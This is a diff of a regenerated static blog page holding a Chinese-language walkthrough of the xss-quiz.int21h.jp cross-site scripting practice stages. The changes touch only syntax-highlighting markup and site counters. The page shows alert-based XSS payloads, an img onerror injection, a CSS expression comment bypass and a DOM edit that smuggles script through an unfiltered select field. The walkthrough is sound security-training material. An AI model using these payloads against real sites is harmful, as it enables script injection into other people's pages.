@@ -402,13 +402,13 @@
 </blockquote>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img onerror=<span class="string">"alert(document.domain);"</span> src= <span class="regexp">/&gt;</span></span><br></pre></td></tr></table></figure>
 <p>or</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <a id="more"></a>
 <h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7</a></p>
 </blockquote>
 <p>先用</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <p>检查源码，发现，组成</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INPUT size=<span class="number">50</span> value=<span class="string">"&lt;script&gt;alert(document.domain);&lt;/script&gt;"</span> name=p1&gt;</span><br></pre></td></tr></table></figure>
 <p>没有过滤，可以组合js，闭合<code>value=&quot;&quot;</code>，进行注入！</p>
@@ -417,11 +417,11 @@
 <p><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82</a></p>
 </blockquote>
 <p>输入：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <p>源码显示：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#60;script&amp;#62;alert(document.domain);&amp;#60;/script&amp;#62;</span><br></pre></td></tr></table></figure>
 <p>输入框发现使用特殊字符：<code>&lt;&gt;&quot;&quot;/ \</code>都被过滤了。<br>打开源码，<strong>不是审查元素</strong>：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"?sid=83ba7c40f05160cdd42fec2bd6fd2f6d6ce5464f"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">Search a place: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"30"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Search"</span>&gt;</span> &amp;nbsp;</span><br><span class="line">Choose a country: <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"p2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>Japan<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>Germany<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>United Kingdom<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">class</span>=<span class="string">"red"</span>&gt;</span>We couldn't find any places called <span class="tag">&lt;<span class="name">b</span>&gt;</span>"&amp;lt;&amp;gt;"<span class="tag">&lt;/<span class="name">b</span>&gt;</span> in <span class="tag">&lt;<span class="name">b</span>&gt;</span>Japan<span class="tag">&lt;/<span class="name">b</span>&gt;</span>.<span class="tag">&lt;<span class="name">hr</span> <span class="attr">class</span>=<span class="string">"red"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"?sid=83ba7c40f05160cdd42fec2bd6fd2f6d6ce5464f"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">Search a place: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"30"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Search"</span>&gt;</span> <span class="symbol">&amp;nbsp;</span></span><br><span class="line">Choose a country: <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"p2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>Japan<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>Germany<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>United Kingdom<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> <span class="attr">class</span>=<span class="string">"red"</span>&gt;</span>We couldn't find any places called <span class="tag">&lt;<span class="name">b</span>&gt;</span>"<span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span>"<span class="tag">&lt;/<span class="name">b</span>&gt;</span> in <span class="tag">&lt;<span class="name">b</span>&gt;</span>Japan<span class="tag">&lt;/<span class="name">b</span>&gt;</span>.<span class="tag">&lt;<span class="name">hr</span> <span class="attr">class</span>=<span class="string">"red"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>可以看到特殊字符，被转译为<code>&amp;lt;&amp;gt;</code>等html字符。<br><br>卡住，看到：解析说输入框不止这一个，随后发现，form表单中还有另一个需要提交的数据，select框的数据，可以通过console修改select中的数据，进而修改提交的数据。而select是没有被过滤的！</p>
 <p>修改dom：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>].p2.childNodes[<span class="number">1</span>].innerHtml = <span class="string">'&lt;script&gt;alert(document.domain);&lt;/script&gt;'</span></span><br></pre></td></tr></table></figure>
@@ -571,7 +571,7 @@
 <blockquote>
 <p>好像是注解绕过</p>
 </blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa:e<span class="comment">/**/</span>xpression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;) ok</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa:e<span class="comment">/**/xpression(onfocus = function()&#123;alert(document.domain)&#125;) ok</span></span><br></pre></td></tr></table></figure>
 <p><strong><font color="orange"><code>\uxxxx</code>这种格式是Unicode写法，表示一个字符，其中xxxx表示一个16进制数字，范围所0～65535. Unicode十六进制数只能包含数字0～9、大写字母A～F或者小写字母A～F。需要注意到是：Unicode的大小端问题，一般都是小端在前，例如 <code>\u5c0f</code> 表示汉语中的 ‘小’字，转换成10进制就是9215，所以在byte数组中应该是1592.</font></strong></p>
 <h1 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1</a></p>
@@ -579,7 +579,7 @@
 <p>输入：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <p>源码查看，不是审查元素</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">"&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;"</span>);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">"&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;"</span>);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <p>可以看到 <code>&lt; &gt;</code>这两个字符被替换为<code>&quot;&amp;lt;</code>和<code>&amp;gt</code>;，说明有过滤！</p>
 <p>由于此页使用<code>document.write(value)</code>，来写出内容，所以肯定存在注入！</p>
 <p>控制台</p>
@@ -756,7 +756,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">78</span>
+                  <span class="site-state-item-count">82</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -891,7 +891,7 @@ show_date_time();
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">73.3k</span>
+    <span title="Site words total count">74.9k</span>
   
 </div>
 
